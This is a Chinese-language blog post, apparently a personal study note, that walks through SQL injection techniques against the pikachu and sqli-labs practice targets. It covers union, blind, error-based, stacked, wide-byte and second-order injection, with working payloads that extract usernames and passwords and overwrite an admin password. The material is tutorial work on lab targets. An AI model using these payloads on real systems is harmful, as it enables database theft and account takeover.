@@ -1,0 +1,448 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>SQL注入 | NaCl1</title>
+<link rel="shortcut icon" href="https://NaCl1.github.io/favicon.ico?v=1704386016631">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://NaCl1.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="SQL注入 | NaCl1 - Atom Feed" href="https://NaCl1.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="SQL注入详解
+1. 数字型注入
+对于数字型注入,无需进行语句闭合
+检测方法:
+1 and 1=1--+
+1 and 1=2--+
+
+若报错,则存在数字型注入
+2. 字符型注入
+对于字符型,需要手动闭合语句中的引号或括号等
+检测方法(判断为..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://NaCl1.github.io">
+  <img class="avatar" src="https://NaCl1.github.io/images/avatar.png?v=1704386016631" alt="">
+  </a>
+  <h1 class="site-title">
+    NaCl1
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              SQL注入
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-10-05
+              </span>
+              <span>
+                9 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="sql注入详解">SQL注入详解</h1>
+<h2 id="1-数字型注入">1. 数字型注入</h2>
+<p>对于数字型注入,无需进行语句闭合</p>
+<p>检测方法:</p>
+<pre><code class="language-sql">1 and 1=1--+
+1 and 1=2--+
+</code></pre>
+<p>若报错,则存在数字型注入</p>
+<h2 id="2-字符型注入">2. 字符型注入</h2>
+<p>对于字符型,需要手动闭合语句中的引号或括号等</p>
+<p>检测方法(判断为字符型还是数字型):</p>
+<pre><code class="language-sql">?id=1'--+
+</code></pre>
+<p>由于输入的 ' 会将查询语句中的 ' 闭合,而在数字型中, ' 会造成语法错误,所以若回显正常页面,则为字符型,若回显报错,则为数字型</p>
+<p>注: &quot;+&quot;在url编码中为一个空格. --注释后不能与 ' 相连</p>
+<h2 id="3-联合注入">3. 联合注入</h2>
+<ol>
+<li>
+<p>猜解字段数 order by:</p>
+<pre><code class="language-sql">?id=1' order by 3--+
+</code></pre>
+</li>
+<li>
+<p>测试出显示位:</p>
+<pre><code class="language-sql">?id=-1' union select 1,2,3--+
+</code></pre>
+</li>
+<li>
+<p>查询mysql信息:</p>
+<pre><code class="language-sql">?id=-1' union select 1,database(),version()--+
+</code></pre>
+</li>
+<li>
+<p>查询表名(pikachu靶场为例):</p>
+<pre><code class="language-sql">?name=-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#
+</code></pre>
+</li>
+<li>
+<p>查询列名:</p>
+<pre><code class="language-sql">?name=-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'#
+</code></pre>
+</li>
+<li>
+<p>查出敏感信息:</p>
+<pre><code class="language-sql">?name=-1' union select 1,group_concat(username,id,password) from users#
+</code></pre>
+</li>
+</ol>
+<p>extra:</p>
+<ol>
+<li>
+<p>查询其他库名:</p>
+<pre><code class="language-sql">union select schema_name from information_schema.schemata;
+</code></pre>
+</li>
+<li></li>
+</ol>
+<h3 id="另外地">另外地:</h3>
+<p>可以尝试用双引号&quot;  括号 )  双引号加括号 &quot;) 来尝试闭合查询语句</p>
+<h2 id="4-布尔型盲注">4. 布尔型盲注</h2>
+<p>对于无回显信息,但存在报错信息的,可以使用布尔型盲注</p>
+<p><em><strong>关键函数</strong></em></p>
+<pre><code class="language-sql">length(); #返回字符串长度
+ascii();  #返回ascii码值
+substr(&quot;1234&quot;,2,1); #截取位置为2,截取长度为1,故值为2
+</code></pre>
+<p>以pikachu靶场为例,猜解数据库名长度(下同):</p>
+<pre><code class="language-sql">lucy' and length(database())&gt;=7#
+</code></pre>
+<p>经过测试,数据库名长度为7,这与&quot;pikachu&quot;这个字符串相符</p>
+<p>猜解所有表名的长度:</p>
+<pre><code class="language-sql">lucy'and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;38#
+</code></pre>
+<p>经过测试其长度为38</p>
+<p>逐个字符猜解数据库名示例:</p>
+<pre><code class="language-sql">lucy'and ascii(substr((select database()),1,1))=112#
+</code></pre>
+<p>这里112为首字母p的ascii码,故会返回正确的lucy的信息</p>
+<p>逐个字符猜解表名,列名方法与上类似</p>
+<h2 id="5-时间型盲注">5. 时间型盲注</h2>
+<p><em><strong>关键函数</strong></em></p>
+<pre><code class="language-sql">if(a&gt;b,sleep(10),1); #若1=1成立,则执行sleep()函数,暂停10秒,否则执行1
+</code></pre>
+<p>猜解数据库名长度:</p>
+<pre><code class="language-sql">lucy'and if(length((select database()))&gt;6,sleep(5),1)#
+</code></pre>
+<p>逐个猜解数据库名字符:</p>
+<pre><code class="language-sql">lucy' and if(ascii(substr((select database()),1,1))=112,sleep(5),1)#
+
+lucy' and if(ascii(substr((select database()),2,1))=105,sleep(5),1)#
+</code></pre>
+<h2 id="6-报错型注入">6. 报错型注入:</h2>
+<p>注:</p>
+<table>
+<thead>
+<tr>
+<th>ASCII码16进制</th>
+<th>对应字符</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x5c</td>
+<td>\</td>
+</tr>
+<tr>
+<td>0x7e</td>
+<td>~</td>
+</tr>
+</tbody>
+</table>
+<p><em><strong>关键函数</strong></em></p>
+<pre><code class="language-sql">extractvalue(XML_document,XPATH_string);
+updatexml(XML_document,XPATH_string,new_value);
+group by #以某种方式分组显示
+</code></pre>
+<h4 id="extractvalue报错注入">extractvalue报错注入</h4>
+<blockquote>
+<p>extractvalue(XML_document,XPath_string)</p>
+<p>第一个参数：XML_document是String格式，为XML文档对象的名称</p>
+<p>第二个参数：XPath_string (Xpath格式的字符串) ,对xml进行匹配</p>
+<p>作用：从XML_document中提取符合XPATH_string的值，当我们XPath_string语法报错时候就会报错</p>
+</blockquote>
+<pre><code class="language-sql">users'and extractvalue(1,concat(1,(select database())))#
+</code></pre>
+<h4 id="updatexml报错注入">updatexml报错注入</h4>
+<blockquote>
+<p>UPDATEXML (XML_document, XPath_string, new_value)</p>
+<p>第一个参数：XML_document是String格式，为XML文档对象的名称</p>
+<p>第二个参数：XPath_string (Xpath格式的字符串)</p>
+<p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>
+<p>作用：改变文档中符合条件的节点的值，改变XML_document中符合XPATH_string的值</p>
+<p>当我们XPath_string语法报错时候就会报错，updatexml()报错注入和extractvalue()报错注入基本差不多。</p>
+</blockquote>
+<pre><code class="language-sql">users' and updatexml(1,concat(0x7e,(select database()),0x7e),1)#
+</code></pre>
+<h4 id="group-by-报错注入">group by 报错注入</h4>
+<p>关于group by 报错注入:</p>
+<p>[https://blog.csdn.net/m0_53065491/article/details/121893986]:</p>
+<pre><code class="language-sql">123' and (select count(*) from information_schema.tables group by concat(database(),0x5c,floor(rand(0)*2)))#     爆数据库
+
+
+123' and (select count(*) from information_schema.tables group by concat(version(),0x5c,floor(rand(0)*2)))#      爆数据库版本
+ 
+ 
+1' and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2)))#    通过修改limit后面数字一个一个爆表
+
+
+1' and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e,floor(rand(0)*2)))#        爆出所有表
+ 
+ 
+ 
+ 
+1' and (select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e,floor(rand(0)*2)))#    爆出所有字段名
+
+
+1' and (select count(*) from information_schema.columns group by concat(0x7e,(select group_concat(username,password) from users),0x7e,floor(rand(0)*2)))#    爆出所有字段名
+
+ 
+1' and (select 1 from(select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select password from users where username='admin1'),0x7e,floor(rand(0)*2)))a)#    爆出该账户的密码。
+</code></pre>
+<h2 id="7-堆叠注入">7. 堆叠注入</h2>
+<p><strong>原理</strong>:在mysql注入中sql语句的默认结束符号为; 在使用多条sql语句时用;隔开,而堆叠注入正是通过使用;来执行多条sql语句</p>
+<p><strong>条件</strong>:</p>
+<blockquote>
+<p>堆叠注入触发的条件很苛刻,因为堆叠注入原理就是通过结束符同时执行多条sql语句,这就需要服<br>
+务器在访问数据端时使用的是可同时执行多条sql语句的方法,比如php中mysqli_multi_query()函数,这个函数在支持同时执行多条sql语句,而与之对应的mysqli_query()函数一次只能执行一条sql语句,所以要想目标存在堆叠注入,在目标主机没有对堆叠注入进行黑名单过滤的情况下必须存在类似于mysqli_multi_query()这样的函数,简单总结下来就是</p>
+<p>1.目标存在sql注入漏洞<br>
+2.目标未对&quot;;&quot;号进行过滤<br>
+3.目标中间层查询数据库信息时可同时执行多条sql语句</p>
+</blockquote>
+<p>示例:</p>
+<pre><code class="language-sql">1' union select 1,2,3;update users set password=123 where id=1--+
+</code></pre>
+<h2 id="8-宽字节注入">8. 宽字节注入</h2>
+<p><strong>前置知识</strong>:</p>
+<blockquote>
+<p>当某字符的大小为一个字节时，称其字符为窄字节</p>
+<p>当某字符的大小为两个字节时，称其字符为宽字节</p>
+<p>所有英文默认占一个字节，汉字占两个字节</p>
+<p>常见的宽字节编码：<a href="https://so.csdn.net/so/search?q=GB2312&amp;spm=1001.2101.3001.7020">GB2312</a>,GBK,GB18030,BIG5,Shift_JIS等</p>
+</blockquote>
+<p>​</p>
+<p><em><strong>关键函数</strong></em></p>
+<pre><code class="language-sql">addslashes() #函数返回在预定义字符之前添加反斜杠的字符串
+
+mysql_real_escape_string() #函数转义 SQL 语句中使用的字符串中的特殊字符
+
+mysql_escape_string() #转义一个字符串
+
+</code></pre>
+<p><strong>原理分析</strong></p>
+<p>php代码中采用某些函数,会在脏字符前加入 \ 以达到转译的目的,</p>
+<p>php函数执行添加的参数采用了单字节编码</p>
+<p>后端数据库采用了宽字节编码,会将两个连在一起的字符当作一个汉字</p>
+<p>因此我们可以在输入的单引号前加入一个字符使\与此字符组成一个汉字,从而达到保留单引号 ' 构造闭合的目的</p>
+<p>示例:</p>
+<pre><code class="language-sql">name=kobe%df’ union select 1,2#
+
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>ascii 16进制码值</th>
+<th>字符</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>27</td>
+<td>'</td>
+</tr>
+<tr>
+<td>5c</td>
+<td>\</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>经过转译后的字符为%df%5c%27   而%df%5c被解码为一个汉字,因此单引号成功逃逸</p>
+<p>注:</p>
+<p>%23 为#的url编码值</p>
+<h2 id="9-搜索型注入">9. 搜索型注入</h2>
+<p>对于搜索型,其满足通过部分字符来查找结果,其搜索的字符在sql语句中用%username%的方式包裹,因此只需要闭合%即可</p>
+<pre><code class="language-sql">kobe%' and 1=1#
+</code></pre>
+<h2 id="10-二次注入">10. 二次注入</h2>
+<p><em><strong>关键函数</strong></em></p>
+<pre><code class="language-sql">addslashes();
+get_magic_quotes_gpc();
+mysql_escape_string();
+mysql_real_escape_string():
+</code></pre>
+<p><strong>原理</strong></p>
+<p>函数的参数在过滤后会添加 “\” 进行转义，但是“\”并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据,在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。</p>
+<p>以sqli-labs/Less24为例:</p>
+<p>首先在注册中插入一个payload,密码任意</p>
+<pre><code>admin'#
+</code></pre>
+<p>之后又登录admin'#这个用户,并修改密码</p>
+<p>此操作会拼接出一条恶意的sql语句</p>
+<pre><code class="language-sql">UPDATE users SET PASSWORD=‘123456’ where username=‘admin’#’ and password=’$curr_pass
+</code></pre>
+<p>修改掉了原有的admin的密码而不是我们插入的admin'#的密码</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3">SQL注入详解</a>
+<ul>
+<li><a href="#1-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5">1. 数字型注入</a></li>
+<li><a href="#2-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5">2. 字符型注入</a></li>
+<li><a href="#3-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5">3. 联合注入</a>
+<ul>
+<li><a href="#%E5%8F%A6%E5%A4%96%E5%9C%B0">另外地:</a></li>
+</ul>
+</li>
+<li><a href="#4-%E5%B8%83%E5%B0%94%E5%9E%8B%E7%9B%B2%E6%B3%A8">4. 布尔型盲注</a></li>
+<li><a href="#5-%E6%97%B6%E9%97%B4%E5%9E%8B%E7%9B%B2%E6%B3%A8">5. 时间型盲注</a></li>
+<li><a href="#6-%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5">6. 报错型注入:</a><br>
+*
+<ul>
+<li><a href="#extractvalue%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">extractvalue报错注入</a></li>
+<li><a href="#updatexml%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">updatexml报错注入</a></li>
+<li><a href="#group-by-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">group by 报错注入</a></li>
+</ul>
+</li>
+<li><a href="#7-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5">7. 堆叠注入</a></li>
+<li><a href="#8-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5">8. 宽字节注入</a></li>
+<li><a href="#9-%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5">9. 搜索型注入</a></li>
+<li><a href="#10-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5">10. 二次注入</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://NaCl1.github.io/post/hi/">
+              <h3 class="post-title">
+                hi
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://NaCl1.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
